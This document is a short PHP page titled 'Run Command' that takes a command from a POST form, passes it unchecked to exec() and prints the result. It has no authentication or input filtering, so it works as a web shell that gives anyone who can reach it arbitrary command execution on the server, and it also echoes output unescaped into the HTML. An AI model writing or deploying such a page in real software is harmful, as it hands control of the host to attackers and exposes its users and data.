<?php
$command = "";
$output = "";

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    $command = $_POST['command'];
    if ($command !=  "") {
        $output =  runCommand($command);
        $output = "<pre>$output</pre>";
    } else {
        $output = "Empty Command";
    }
}





function runCommand(string $command)
{
    return exec($command);
}


?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Run Command</title>
</head>

<body>
    <h3>RunCommand</h3>
    <form action="command.php" method="post">
        <input type="text" name="command" id=""><button>SEND</button>
    </form>
    <h3>Output</h3>
    <div>
        <p><?= $output ?></p>
    </div>

</body>

</html>